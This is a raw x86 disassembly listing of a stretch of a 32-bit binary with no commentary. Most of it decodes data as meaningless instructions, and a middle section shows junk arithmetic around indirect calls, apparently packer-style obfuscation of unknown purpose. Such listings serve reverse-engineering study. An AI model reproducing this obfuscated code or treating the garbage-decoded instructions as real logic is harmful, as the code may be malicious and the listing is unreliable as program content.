  41715d:	mov    BYTE PTR [edi+ecx*2+0x10],ch
  417161:	je     0x417135
  417163:	push   ecx
  417164:	out    0x2e,eax
  417166:	scas   eax,DWORD PTR es:[edi]
  417167:	adc    eax,0xad93e7c4
  41716c:	jl     0x41711c
  41716e:	mov    ebp,0x9f27346d
  417173:	ret    
  417174:	xor    BYTE PTR [esi],dl
  417176:	inc    eax
  417177:	or     esp,DWORD PTR [ebp-0x2a]
  41717a:	lds    edi,FWORD PTR [edx+0x1e]
  41717d:	and    al,0xac
  41717f:	(bad)  
  417180:	clc    
  417181:	inc    eax
  417182:	jne    0x417110
  417184:	mov    dl,0xa5
  417186:	jns    0x4171b1
  417188:	addr16 pop ds
  41718a:	push   ss
  41718b:	jne    0x417205
  41718d:	jmp    0x44071a70
  417192:	icebp  
  417193:	add    eax,0xa19c17b0
  417198:	fcmovu st,st(0)
  41719a:	xor    bl,BYTE PTR [eax]
  41719c:	mov    eax,esi
  41719e:	retf   
  41719f:	inc    ebx
  4171a0:	or     ch,BYTE PTR [ebx+0x1f]
  4171a3:	push   ds
  4171a4:	adc    DWORD PTR [eax-0x47],ecx
  4171a7:	push   0xffffffe3
  4171a9:	push   ebp
  4171aa:	out    dx,al
  4171ab:	stc    
  4171ac:	xchg   BYTE PTR [edi-0x7b28870],bh
  4171b2:	or     dh,bl
  4171b4:	ds lahf 
  4171b6:	xlat   BYTE PTR ds:[ebx]
  4171b7:	mov    al,0xd7
  4171b9:	push   es
  4171ba:	fdiv   DWORD PTR [ebx+0x11]
  4171bd:	adc    bh,BYTE PTR [edx+0x49]
  4171c0:	mov    ebx,0x6906943e
  4171c5:	loop   0x4171ea
  4171c7:	imul   eax,DWORD PTR [ebx+0x7c99cbb7],0xa8ab74ad
  4171d1:	mov    cl,0x3a
  4171d3:	push   ebx
  4171d4:	push   edi
  4171d5:	pop    ebx
  4171d6:	sub    BYTE PTR [ebx-0x1c],bl
  4171d9:	in     al,0x81
  4171db:	mov    eax,ds:0xa05a5aa4
  4171e0:	sub    al,0xa6
  4171e2:	mov    ebx,0x30444d31
  4171e7:	jb     0x4171cd
  4171e9:	xchg   ecx,eax
  4171ea:	retf   0x704d
  4171ed:	mov    al,fs:0xdd5795b
  4171f3:	sahf   
  4171f4:	sub    eax,0x37a616cf
  4171f9:	inc    ebx
  4171fa:	adc    esp,DWORD PTR [eax-0x38]
  4171fd:	or     cl,cl
  4171ff:	pop    es
  417200:	fwait
  417201:	inc    eax
  417202:	dec    ecx
  417203:	sbb    BYTE PTR [ebx],0xe4
  417206:	jno    0x4171a5
  417208:	fsin   
  41720a:	jecxz  0x417205
  41720c:	pusha  
  41720d:	and    al,0xd4
  41720f:	(bad)  
  417210:	ja     0x417196
  417212:	jno    0x417227
  417214:	adc    DWORD PTR [ecx-0x11],edx
  417217:	mov    al,0x49
  417219:	push   ebx
  41721a:	mov    bh,0xc9
  41721c:	in     al,0x4e
  41721e:	cli    
  41721f:	jp     0x41729a
  417221:	adc    BYTE PTR [ebp-0x6a28fd8a],ah
  417227:	fpatan 
  417229:	and    al,0x1e
  41722b:	retf   
  41722c:	xlat   BYTE PTR ds:[ebx]
  41722d:	mov    ebp,0xcc52d208
  417232:	mov    ss,esi
  417234:	cmp    eax,0x91ae4a6a
  417239:	xor    BYTE PTR [esi],al
  41723b:	sbb    edi,DWORD PTR [eax-0x1c843c3]
  417241:	push   cs
  417242:	mov    bh,BYTE PTR [edx-0x1eec3c70]
  417248:	call   0x95f03ae4
  41724d:	inc    esp
  41724e:	inc    ebx
  41724f:	cmc    
  417250:	jo     0x4172b1
  417252:	cmp    ecx,DWORD PTR [ecx+eax*4-0x58]
  417256:	(bad)  
  417257:	jmp    0x9742f32b
  41725c:	mov    esp,DWORD PTR [ecx-0x3503984c]
  417262:	push   ecx
  417263:	test   eax,ebx
  417265:	sbb    al,0x10
  417267:	mov    DWORD PTR [edx+0x19dd1831],eax
  41726d:	in     al,0xc1
  41726f:	imul   ebx,DWORD PTR [ecx],0x90178bec
  417275:	push   edi
  417276:	enter  0xc8f9,0x62
  41727a:	dec    edx
  41727b:	cmp    BYTE PTR [ecx],cl
  41727d:	pop    ecx
  41727e:	pop    ebp
  41727f:	sbb    BYTE PTR ds:0xb1a10f21,ch
  417285:	dec    esi
  417286:	add    ch,BYTE PTR [eax+0x8de88d6]
  41728c:	xor    BYTE PTR [edx+0x2c],ch
  41728f:	(bad)  
  417290:	leave  
  417291:	mov    ds:0x39b3d129,al
  417296:	outs   dx,BYTE PTR ds:[esi]
  417297:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417298:	xchg   ecx,eax
  417299:	outs   dx,BYTE PTR ds:[esi]
  41729a:	xchg   esi,eax
  41729b:	call   0x93145b5f
  4172a0:	arpl   WORD PTR [eax+ecx*8-0x2f],si
  4172a4:	push   ds
  4172a5:	cmp    dh,BYTE PTR [ebx]
  4172a7:	retf   
  4172a8:	mov    eax,0x1b68151b
  4172ad:	in     eax,dx
  4172ae:	sbb    dl,BYTE PTR [esi]
  4172b0:	fistp  WORD PTR [edx+0x52db5af6]
  4172b6:	cmp    eax,0x3f9a7d2
  4172bb:	out    dx,eax
  4172bc:	xchg   ecx,eax
  4172bd:	mov    eax,0xe0b15d
  4172c2:	fldcw  WORD PTR [edx-0x2f]
  4172c5:	test   BYTE PTR [esi],dh
  4172c7:	and    DWORD PTR [edx-0x16],ebx
  4172ca:	das    
  4172cb:	jno    0x4172c9
  4172cd:	sbb    BYTE PTR [edx+0x52],bl
  4172d0:	mov    ah,0xd8
  4172d2:	nop
  4172d3:	sbb    ebx,DWORD PTR [ecx+eax*8+0x2f347c95]
  4172da:	nop
  4172db:	cmp    ecx,DWORD PTR [esi+0x5057a05d]
  4172e1:	outs   dx,BYTE PTR ds:[esi]
  4172e2:	push   ds
  4172e3:	inc    esp
  4172e4:	xor    BYTE PTR ds:0x7bd2f824,ch
  4172ea:	mov    ebx,0x715c2f4e
  4172ef:	mov    edx,0x925bd051
  4172f4:	jecxz  0x417345
  4172f6:	mov    ebp,0x55c733a0
  4172fb:	mov    bl,0xf6
  4172fd:	outs   dx,BYTE PTR ds:[esi]
  4172fe:	std    
  4172ff:	add    eax,0x562c5215
  417304:	cmc    
  417305:	dec    esp
  417306:	ret    0xeb3d
  417309:	jno    0x41732a
  41730b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41730c:	out    0xc1,al
  41730e:	add    ah,bh
  417310:	bound  esi,QWORD PTR ds:0x17c3cbd4
  417316:	push   ebx
  417317:	nop
  417318:	cmc    
  417319:	out    0x5d,eax
  41731b:	int    0x8e
  41731d:	xchg   esi,eax
  41731e:	fwait
  41731f:	push   edi
  417320:	in     eax,0xe0
  417322:	sbb    eax,0x2f2b9be9
  417327:	and    ch,cl
  417329:	aaa    
  41732a:	xchg   edx,ebp
  41732c:	fsub   DWORD PTR [ebx+0x10]
  41732f:	sub    ch,al
  417331:	movzx  eax,BYTE PTR [edx]
  417334:	push   ds
  417335:	mov    eax,0x6d07c298
  41733a:	stc    
  41733b:	call   0x634e:0x317a437d
  417342:	add    al,0x1b
  417344:	(bad)  
  417345:	mov    edx,0xc771c661
  41734a:	pop    esp
  41734b:	sbb    BYTE PTR [eax+0x448da6b8],cl
  417351:	and    al,0x44
  417353:	mov    DWORD PTR [esp+0xc],eax
  417357:	cmp    DWORD PTR ds:0x42832d,0x0
  41735e:	mov    DWORD PTR ds:0x428471,edi
  417364:	mov    ecx,0x653d
  417369:	jmp    0x417446
  41736e:	mov    DWORD PTR ds:0x428415,0x6fab
  417378:	mov    DWORD PTR ds:0x428409,0x3325
  417382:	cmp    DWORD PTR ds:0x42832d,0x0
  417389:	jl     0x4173a7
  41738f:	push   DWORD PTR [ebp-0x20]
  417392:	push   DWORD PTR [ebp-0xc]
  417395:	call   DWORD PTR ds:0x42e0ec
  41739b:	xor    edi,0x628b
  4173a1:	or     edi,0x2ad9
  4173a7:	and    DWORD PTR ds:0x42855d,edx
  4173ad:	and    ecx,DWORD PTR ds:0x428579
  4173b3:	xor    edi,edi
  4173b5:	add    edi,DWORD PTR ds:0x4284ad
  4173bb:	mov    edx,DWORD PTR ds:0x4285a5
  4173c1:	sub    edi,edx
  4173c3:	or     edi,DWORD PTR [edi+edx*1]
  4173c6:	inc    edx
  4173c7:	cmp    DWORD PTR ds:0x428355,0x0
  4173ce:	mov    DWORD PTR ds:0x428479,0x322b
  4173d8:	mov    DWORD PTR ds:0x428375,0x622c
  4173e2:	mov    edx,DWORD PTR ds:0x428345
  4173e8:	mov    DWORD PTR ds:0x4284cd,0x673b
  4173f2:	jmp    0x417446
  4173f7:	mov    DWORD PTR ds:0x42834d,edx
  4173fd:	cmp    DWORD PTR ds:0x428355,0x0
  417404:	jl     0x41742c
  41740a:	push   DWORD PTR [ebp-0x24]
  41740d:	push   0x428243
  417412:	call   DWORD PTR ds:0x42e27c
  417418:	sbb    DWORD PTR ds:0x428351,0x4806
  417422:	add    DWORD PTR ds:0x4284e1,0x48d6
  41742c:	add    edi,0x263
  417432:	xor    DWORD PTR ds:0x428359,0x2f2b
  41743c:	add    DWORD PTR ds:0x428581,0x7768
  417446:	lea    eax,[esp+0x60]
  41744a:	xor    ecx,ecx
  41744c:	or     ecx,DWORD PTR ds:0x42833d
  417452:	xor    DWORD PTR ds:0x428359,ecx
  417458:	mov    DWORD PTR [esp+0x10],eax
  41745c:	sub    edi,DWORD PTR ds:0x4284fd
  417462:	mov    eax,ds:0x422708
  417467:	sbb    DWORD PTR ds:0x428479,edx
  41746d:	mov    eax,DWORD PTR [eax+0x1d8]
  417473:	cmp    DWORD PTR ds:0x42847d,0x0
  41747a:	mov    edi,0x142d
  41747f:	mov    DWORD PTR ds:0x42836d,edi
  417485:	jmp    0x4174dd
  41748a:	not    ecx
  41748c:	cmp    DWORD PTR ds:0x42847d,0x0
  417493:	jg     0x4174bb
  417499:	push   DWORD PTR [ebp-0x1c]
  41749c:	push   0x483b
  4174a1:	call   DWORD PTR ds:0x42e0f0
  4174a7:	and    DWORD PTR ds:0x4284ed,0x19ab
  4174b1:	xor    DWORD PTR ds:0x428341,0x742c
  4174bb:	add    edx,DWORD PTR ds:0x428559
  4174c1:	sub    DWORD PTR ds:0x428469,0x7d91
  4174cb:	mov    edx,DWORD PTR ds:0x42841d
  4174d1:	or     DWORD PTR ds:0x4284e5,edx
  4174d7:	adc    DWORD PTR ds:0x4284f1,ecx
  4174dd:	mov    eax,DWORD PTR [eax]
  4174df:	mov    edi,DWORD PTR ds:0x428515
  4174e5:	mov    ecx,DWORD PTR ds:0x428591
  4174eb:	sub    ecx,edi
  4174ed:	or     edi,DWORD PTR [edi+ecx*1]
  4174f0:	mov    ecx,eax
  4174f2:	xor    ecx,0xa5069baf
  4174f8:	xor    edx,edx
  4174fa:	or     edx,DWORD PTR ds:0x428449
  417500:	sub    edx,DWORD PTR ds:0x42846d
  417506:	mov    DWORD PTR ds:0x428449,edx
  41750c:	xor    eax,0xfffffffe
  41750f:	shl    eax,0x1e
  417512:	and    DWORD PTR ds:0x428339,edi
  417518:	shr    ecx,0x2
  41751b:	or     ecx,eax
  41751d:	mov    eax,DWORD PTR [esp+0x10]
  417521:	inc    edx
  417522:	mov    DWORD PTR [eax],ecx
  417524:	xor    edx,edi
  417526:	mov    edi,0xcb79b566
  41752b:	mov    DWORD PTR [esp+0x80],edi
  417532:	mov    DWORD PTR [esp+0x84],esi
  417539:	cmp    DWORD PTR ds:0x428415,0x0
  417540:	movzx  ecx,WORD PTR ds:0x428345
  417547:	movzx  ecx,BYTE PTR ds:0x428439
  41754e:	jmp    0x4175bc
  417553:	not    edx
  417555:	cmp    DWORD PTR ds:0x428415,0x0
  41755c:	jb     0x4175ae
  417562:	push   DWORD PTR [ebp-0x20]
  417565:	push   0x1e74
  41756a:	push   0x10b8
  41756f:	push   0x6d55
  417574:	push   DWORD PTR [ebp-0x18]
  417577:	push   DWORD PTR [ebp-0x1c]
  41757a:	call   DWORD PTR ds:0x42e0f4
  417580:	movzx  edx,BYTE PTR ds:0x428581
  417587:	add    edx,DWORD PTR ds:0x4284e9
  41758d:	mov    DWORD PTR ds:0x428581,edx
  417593:	xor    ecx,ecx
  417595:	xor    ecx,DWORD PTR ds:0x4283b9
  41759b:	xor    edx,edx
  41759d:	xor    edx,DWORD PTR ds:0x428531
  4175a3:	sub    ecx,edx
  4175a5:	sub    ecx,DWORD PTR [ecx+edx*1]
  4175a8:	add    DWORD PTR ds:0x42836d,edx
  4175ae:	xor    DWORD PTR ds:0x428569,ebx
  4175b4:	sbb    DWORD PTR ds:0x428405,edx
  4175ba:	adc    edx,ecx
  4175bc:	mov    eax,DWORD PTR [esp+0x80]
  4175c3:	or     edx,edx
  4175c5:	mov    ecx,DWORD PTR [esp+0x84]
  4175cc:	cmp    DWORD PTR ds:0x428479,0x0
  4175d3:	mov    edx,DWORD PTR ds:0x42847d
  4175d9:	mov    DWORD PTR ds:0x428349,0x64c4
  4175e3:	mov    edx,DWORD PTR ds:0x42840d
  4175e9:	jmp    0x417644
  4175ee:	mov    DWORD PTR ds:0x428431,0x1a08
  4175f8:	cmp    DWORD PTR ds:0x428479,0x0
  4175ff:	ja     0x417624
  417605:	push   DWORD PTR [ebp-0x1c]
  417608:	call   DWORD PTR ds:0x42e280
  41760e:	sbb    edx,DWORD PTR ds:0x428351
  417614:	adc    DWORD PTR ds:0x42841d,0x1011
  41761e:	sbb    DWORD PTR ds:0x4284d5,ebx
  417624:	xor    edx,edx
  417626:	or     edx,DWORD PTR ds:0x428405
  41762c:	xor    DWORD PTR ds:0x42854d,edx
  417632:	add    DWORD PTR ds:0x42840d,ebx
  417638:	add    edx,0x156e
  41763e:	sub    edx,0x437f
  417644:	shrd   eax,ecx,0x2
  417648:	cmp    DWORD PTR ds:0x428501,0x0
  41764f:	mov    edx,0x364f
  417654:	mov    DWORD PTR ds:0x4284f5,0x205c
  41765e:	mov    edx,0xb6f
  417663:	jmp    0x4176bb
  417668:	mov    edx,DWORD PTR ds:0x428545
  41766e:	mov    DWORD PTR ds:0x428371,edi
  417674:	cmp    DWORD PTR ds:0x428501,0x0
  41767b:	jae    0x4176a7
  417681:	push   DWORD PTR [ebp-0x18]
  417684:	call   DWORD PTR ds:0x42e0f8
  41768a:	sub    DWORD PTR ds:0x428449,0x4a16
  417694:	mov    edx,DWORD PTR ds:0x428581
  41769a:	or     DWORD PTR ds:0x428565,edx
  4176a0:	sub    DWORD PTR ds:0x42854d,ecx
  4176a6:	dec    edx
  4176a7:	dec    edx
  4176a8:	not    DWORD PTR ds:0x428331
  4176ae:	movzx  edx,WORD PTR ds:0x428545
  4176b5:	sub    DWORD PTR ds:0x4284fd,edx
  4176bb:	shr    ecx,0x2
  4176be:	mov    ecx,DWORD PTR [esp+0x80]
  4176c5:	mov    edx,DWORD PTR [esp+0x84]
  4176cc:	add    DWORD PTR ds:0x428335,0x428361
  4176d6:	xor    eax,0x32de6d5d
  4176db:	adc    DWORD PTR ds:0x428365,0x4c3b
  4176e5:	xor    edx,edx
  4176e7:	or     DWORD PTR ds:0x4284dd,0x428351
  4176f1:	or     edx,eax
  4176f3:	mov    eax,ds:0x428465
  4176f8:	adc    DWORD PTR ds:0x428571,eax
  4176fe:	mov    eax,ds:0x422708
  417703:	or     DWORD PTR ds:0x42840d,0x428441
  41770d:	push   edx
  41770e:	or     DWORD PTR ds:0x428425,0x3421
  417718:	push   DWORD PTR [eax+0x19c]
  41771e:	lea    eax,[esp+0x80]
  417725:	push   eax
  417726:	sbb    DWORD PTR ds:0x428351,0x428465
  417730:	shl    ecx,0x1e
  417733:	call   0x411c08
  417738:	or     DWORD PTR ds:0x42840d,0x889
  417742:	lea    eax,[ebp+0x10]
  417745:	add    DWORD PTR ds:0x428435,0x428371
  41774f:	push   eax
  417750:	or     DWORD PTR ds:0x428411,0x378
  41775a:	mov    DWORD PTR [esp+0x14],edi
  41775e:	mov    DWORD PTR [esp+0x18],esi
  417762:	add    DWORD PTR ds:0x42856d,0x1c44
  41776c:	lea    eax,[ebp+0xc]
  41776f:	sbb    DWORD PTR ds:0x428565,0x6a60
  417779:	push   eax
  41777a:	adc    DWORD PTR ds:0x428481,0x65f7
  417784:	mov    DWORD PTR [esp+0x18],edi
  417788:	lea    eax,[ebp+0x8]
  41778b:	mov    DWORD PTR [esp+0x1c],esi
  41778f:	sub    DWORD PTR ds:0x428479,0x37c8
  417799:	jmp    0x4179f6
  41779e:	cmp    edx,eax
  4177a0:	retf   
  4177a1:	mov    esp,0x44b9bc3c
  4177a6:	out    0x8d,eax
  4177a8:	push   es
  4177a9:	xchg   edx,eax
  4177aa:	outs   dx,DWORD PTR ds:[esi]
  4177ab:	in     eax,0xbf
  4177ad:	iret   
  4177ae:	sti    
  4177af:	faddp  st(0),st
  4177b1:	mov    esi,0xbebec235
  4177b6:	dec    esi
  4177b7:	pop    edx
  4177b8:	mov    esi,0x9a0da8c3
  4177bd:	xchg   ecx,eax
  4177be:	mov    ebx,0x1a13b82e
  4177c3:	sub    al,0xb7
  4177c5:	or     esi,DWORD PTR [edx+0x4fabc1e3]
  4177cb:	add    DWORD PTR [ecx-0x5dc55b1f],edi
  4177d1:	xchg   edx,eax
  4177d2:	jle    0x41778b
  4177d4:	push   edi
  4177d5:	add    al,0x53
  4177d7:	(bad)  
  4177d8:	js     0x41781c
  4177da:	fild   QWORD PTR [ecx+ecx*4+0x2b848372]
  4177e1:	sbb    al,BYTE PTR [ebx+0x4c]
  4177e4:	jmp    0x22ab:0xe7288efc
  4177eb:	icebp  
  4177ec:	jae    0x41783e
  4177ee:	cmp    al,0xcb
  4177f0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4177f1:	mov    cl,dl
  4177f3:	sbb    BYTE PTR [eax-0x4a212866],ah
  4177f9:	je     0x4177a9
  4177fb:	cmp    al,0xe2
  4177fd:	fiadd  WORD PTR [ebp+0x50]
  417800:	popa   
  417801:	pop    ecx
  417802:	sub    esi,esi
  417804:	es inc eax
  417806:	je     0x41786c
  417808:	shl    esi,cl
  41780a:	mov    BYTE PTR [ebx+0x1d],cl
  41780d:	and    al,0x2a
  41780f:	add    al,0xc3
  417811:	lods   eax,DWORD PTR ds:[esi]
  417812:	jmp    0xa74e:0xfb61617e
  417819:	outs   dx,BYTE PTR ds:[esi]
  41781a:	sub    dh,dl
  41781c:	pop    esi
  41781d:	sub    eax,0x3e1b5d2c
  417822:	pusha  
  417823:	mov    bh,0x74
  417825:	sbb    dh,BYTE PTR [edi]
  417827:	add    eax,0x78bdc63
  41782c:	ret    0x8abf
  41782f:	test   dh,al
  417831:	test   DWORD PTR [edx],edx
  417833:	in     eax,0x9f
  417835:	sbb    DWORD PTR [ebx+edx*2-0x3300e264],ebp
  41783c:	pop    ebx
  41783d:	sahf   
  41783e:	and    DWORD PTR [edx+0x19],0xffffffe2
  417842:	in     al,dx
  417843:	jns    0x4177e5
  417845:	sbb    eax,DWORD PTR [ebx-0x55]
  417848:	leave  
  417849:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41784a:	cmp    al,0x1b
  41784c:	xor    DWORD PTR [ebx],esi
  41784e:	sbb    al,0x26
  417850:	adc    DWORD PTR [edx+0x64ca6a22],edx
  417856:	push   edx
  417857:	fs lahf 
  417859:	sub    al,0x6e
  41785b:	das    
  41785c:	retf   
  41785d:	fidiv  DWORD PTR [esi]
  41785f:	mov    al,ds:0xcc5651c
  417864:	imul   ecx,DWORD PTR ss:[esi],0x4d
  417868:	adc    ch,BYTE PTR [esi-0x6d4d94da]
  41786e:	pop    ss
  41786f:	fs jne 0x4177f2
  417872:	stc    
  417873:	std    
  417874:	add    dl,bl
  417876:	and    al,0xfb
  417878:	in     eax,0xde
  41787a:	mov    ah,0xc4
  41787c:	sub    al,0xa8
  41787e:	mov    esi,0x4a7549b0
  417883:	mov    ah,0xea
  417885:	shl    DWORD PTR [edi+0x42],1
  417888:	sbb    eax,0x22f09165
  41788d:	add    DWORD PTR [ecx],ebx
  41788f:	pop    ds
  417890:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417891:	inc    esp
  417892:	push   ss
  417893:	pop    ss
  417894:	cmp    edi,esp
  417896:	xchg   ebx,eax
  417897:	mov    fs,WORD PTR [ecx]
  417899:	daa    
  41789a:	add    eax,0x712a3974
  41789f:	jnp    0x4178ba
  4178a1:	pop    es
  4178a2:	js     0x417869
  4178a4:	adc    BYTE PTR [ebp-0x27],dh
  4178a7:	push   ss
  4178a8:	sub    ebx,DWORD PTR [eax-0x2c]
  4178ab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4178ac:	mov    edx,0x838328a8
  4178b1:	pop    ecx
  4178b2:	mov    dl,BYTE PTR [edx+0x5476a610]
  4178b8:	add    ebx,DWORD PTR [eax-0xf]
  4178bb:	ret    0xacc0
  4178be:	xchg   ebp,eax
  4178bf:	push   es
  4178c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4178c1:	out    dx,eax
  4178c2:	push   edi
  4178c3:	xlat   BYTE PTR ds:[ebx]
  4178c4:	int    0xba
  4178c6:	adc    DWORD PTR [ecx+0x6],edi
  4178c9:	push   edi
  4178ca:	dec    ebp
  4178cb:	test   BYTE PTR [ecx-0x25017325],bl
  4178d1:	inc    esi
  4178d2:	pop    ebx
  4178d3:	pusha  
  4178d4:	sub    al,0xf1
  4178d6:	xchg   ebp,eax
  4178d7:	push   ebp
  4178d8:	sub    al,0xb9
  4178da:	(bad)  
  4178db:	mov    ah,0xcb
  4178dd:	fistp  WORD PTR [ebx+0x243aee10]
  4178e3:	cs xchg ebx,eax
  4178e5:	test   BYTE PTR [edx],cl
  4178e7:	cli    
  4178e8:	bound  eax,QWORD PTR [ebp-0x7a]
  4178eb:	sbb    ebp,ecx
  4178ed:	sbb    eax,0x7ebc02d0
  4178f2:	arpl   ax,bp
  4178f4:	das    
  4178f5:	xor    BYTE PTR [eax-0x5f19befc],bl
  4178fb:	mov    al,0x37
  4178fd:	xchg   dh,al
  4178ff:	aas    
  417900:	push   ds
  417901:	ss shr ecx,cl
  417904:	outs   dx,BYTE PTR ds:[esi]
  417905:	ror    BYTE PTR [edi-0x1d],1
  417908:	mov    DWORD PTR [eax-0x106c24f7],edi
  41790e:	gs pop esi
  417910:	xor    DWORD PTR [ecx+eax*1+0x4d],edx
  417914:	inc    ebp
  417915:	jno    0x417981
  417917:	push   DWORD PTR [ebp-0x78]
  41791a:	jmp    0x41798e
  41791c:	add    esi,DWORD PTR [ebx+edx*2+0x731f392a]
  417923:	ss xchg ah,bl
  417926:	(bad)  
  417927:	out    dx,eax
  417928:	jo     0x41790d
  41792a:	ja     0x4178be
  41792c:	inc    ebx
  41792d:	fadd   st(4),st
  41792f:	lahf   
  417930:	enter  0x9214,0x5d
  417934:	in     eax,dx
  417935:	push   ecx
  417936:	dec    esi
  417937:	mov    eax,ds:0xb2d9fb9a
  41793c:	xchg   ecx,eax
  41793d:	ds dec eax
  41793f:	popa   
  417940:	mov    BYTE PTR [edx],al
  417942:	sub    esi,eax
  417944:	pusha  
  417945:	ss int 0x6e
  417948:	call   0x467bb7dd
  41794d:	daa    
  41794e:	in     eax,0x7f
  417950:	and    ecx,DWORD PTR [ebx+0x19dc8f93]
  417956:	xor    BYTE PTR [esi+0xc4ea30f],cl
  41795c:	arpl   WORD PTR [ebp-0x66],cx
  41795f:	mov    BYTE PTR [ebx],dl
  417961:	in     al,dx
  417962:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417963:	xor    dh,cl
  417965:	scas   al,BYTE PTR es:[edi]
  417966:	or     eax,0x29844a74
  41796b:	push   ecx
  41796c:	shl    DWORD PTR [edi-0x3169cd41],0x61
  417973:	je     0x417926
  417975:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417976:	sub    al,BYTE PTR [ebx]
  417978:	repz mov ah,BYTE PTR [edi]
  41797b:	mov    esi,0x9287d690
  417980:	adc    al,0x23
  417983:	into   
  417984:	xchg   edx,eax
  417985:	and    dl,BYTE PTR cs:[ebp-0x3e]
  417989:	mov    al,ds:0xbaf1e6b
  41798e:	xchg   DWORD PTR [ebp-0x52],edi
  417991:	xchg   esi,eax
  417992:	outs   dx,BYTE PTR ds:[esi]
  417993:	and    eax,DWORD PTR [esi+0x77]
  417996:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417997:	xor    al,0x41
  417999:	push   0xa7f3c22f
  41799e:	stos   DWORD PTR es:[edi],eax
  41799f:	inc    esi
  4179a0:	sbb    cl,BYTE PTR [ecx]
  4179a2:	add    DWORD PTR [ebp+0x2efb0ad1],ecx
  4179a8:	imul   esp,DWORD PTR [ecx+eiz*8+0x4d18871e],0xffffffa4
  4179b0:	aaa    
  4179b1:	scas   eax,DWORD PTR es:[edi]
  4179b2:	retf   0xbfd6
  4179b5:	je     0x417a1e
  4179b7:	and    al,0xb2
  4179b9:	xchg   edi,eax
  4179ba:	popf   
  4179bb:	mov    ah,0x5f
  4179bd:	js     0x4179eb
  4179bf:	pop    ebx
  4179c0:	xchg   DWORD PTR [esi],esi
  4179c2:	cli    
  4179c3:	mov    edi,0x5f4608c7
  4179c8:	cld    
  4179c9:	sbb    ah,dl
  4179cb:	fmulp  st(4),st
  4179cd:	stos   DWORD PTR es:[edi],eax
  4179ce:	jns    0x4179b1
  4179d0:	fld    QWORD PTR [ebx]
  4179d2:	retf   0x55d8
  4179d5:	imul   ebp,DWORD PTR [eax+0x60559a47],0xffffffac
  4179dc:	arpl   WORD PTR [ebx+ebx*1],bp
  4179df:	sbb    DWORD PTR [ebp+0x15a238a1],0xffffffd9
  4179e6:	retf   
  4179e7:	and    al,0xb7
  4179e9:	jb     0x4179b0
  4179eb:	mov    BYTE PTR [eax+ecx*4-0x70],ah
  4179ef:	xlat   BYTE PTR ds:[ebx]
  4179f0:	xchg   esi,eax
  4179f1:	fdivrp st(1),st
  4179f3:	add    edx,DWORD PTR ds:0x247c8967
  4179f9:	sbb    BYTE PTR [ecx+0x4284d915],al
  4179ff:	add    BYTE PTR [ebp-0x7d],ch
  417a02:	inc    edx
  417a03:	add    cl,ch
  417a05:	pop    eax
  417a06:	add    al,BYTE PTR [eax]
  417a08:	add    BYTE PTR [eax],ah
  417a0a:	add    ebp,ebx
  417a0c:	xchg   ecx,eax
  417a0d:	jecxz  0x4179c1
  417a0f:	mov    ah,0xb4
  417a11:	jb     0x417a54
  417a13:	sahf   
  417a14:	nop
  417a15:	mov    eax,edx
  417a17:	mov    ds:0xc0e27390,al
  417a1c:	mov    esi,0xbebec235
  417a21:	pop    ds
  417a22:	jmp    0x4ec33c81
  417a27:	mov    eax,0x83f0e708
  417a2c:	cmp    eax,0xd67b822a
  417a31:	lea    esi,[ebx+0x2c]
  417a34:	mov    eax,ds:0x746e414e
  417a39:	repnz sti 
  417a3b:	add    BYTE PTR [ebp+0x1ccecf20],0xfd
  417a42:	out    0x7,al
  417a44:	and    cl,cl
  417a46:	pop    ebx
  417a47:	shl    DWORD PTR [edx],cl
  417a49:	fnstenv [edi+0x71002da0]
  417a4f:	(bad)  
  417a50:	cli    
  417a51:	dec    esp
  417a52:	in     eax,dx
  417a53:	pop    esp
  417a54:	push   ebp
  417a55:	push   ebp
  417a56:	mov    ds:0xc937299a,eax
  417a5b:	mov    eax,ds:0xab03dc2f
  417a60:	stc    
  417a61:	inc    ebx
  417a62:	sar    DWORD PTR [ebp-0x564db561],cl
  417a68:	or     esi,ebp
  417a6a:	or     DWORD PTR [esi],ebx
  417a6c:	jmp    0x417a89
  417a6e:	loopne 0x417a55
  417a70:	shl    DWORD PTR ds:[ecx+0x17],1
  417a74:	cmp    DWORD PTR [eax-0x48e92ecf],esi
  417a7a:	pop    ecx
  417a7b:	out    dx,al
  417a7c:	je     0x417a4f
  417a7e:	(bad)  
  417a7f:	(bad)  
  417a80:	call   0x2e9ab0c3
  417a85:	or     al,0x44
  417a87:	cmp    al,0x17
  417a89:	loope  0x417ab7
  417a8b:	jb     0x417a40
  417a8d:	mov    esp,0xd8bbf356
  417a92:	xor    al,0x8
  417a94:	xchg   ebp,eax
  417a95:	ret    0xce27
  417a98:	scas   al,BYTE PTR es:[edi]
  417a99:	std    
  417a9a:	pop    ds
  417a9b:	mov    eax,0xf798d7a1
  417aa0:	ins    DWORD PTR es:[edi],dx
  417aa1:	mov    edi,0xe99747dd
  417aa6:	scas   eax,DWORD PTR es:[edi]
  417aa7:	fst    DWORD PTR [edx]
  417aa9:	scas   al,BYTE PTR es:[edi]
  417aaa:	adc    al,0xed
  417aac:	fwait
  417aad:	mov    ah,0xb5
  417aaf:	cmp    DWORD PTR ds:0x4fac59ef,esp
  417ab5:	out    0xc3,eax
  417ab7:	lods   eax,DWORD PTR ds:[esi]
  417ab8:	retf   
  417ab9:	das    
  417aba:	mov    ds:0x38dd6fd2,eax
  417abf:	es gs jg 0x417b32
  417ac3:	jmp    0x417b00
  417ac5:	cmp    al,0xc
  417ac7:	xchg   esp,eax
  417ac8:	test   BYTE PTR [edi],ah
  417aca:	loope  0x417a5e
  417acc:	dec    eax
  417acd:	add    al,0x1b
  417acf:	push   es
  417ad0:	add    ebx,edx
  417ad2:	inc    ecx
  417ad3:	dec    ebx
  417ad4:	xor    BYTE PTR [ecx],bh
  417ad6:	mov    al,ds:0x19155f2d
  417adb:	out    0xd,eax
  417add:	or     dh,ch
  417adf:	std    
  417ae0:	out    dx,eax
  417ae1:	shr    DWORD PTR [edi],1
  417ae3:	mov    bl,0x43
  417ae5:	cmp    BYTE PTR [eax-0x1c77f046],bh
  417aeb:	push   eax
  417aec:	test   al,0x1f
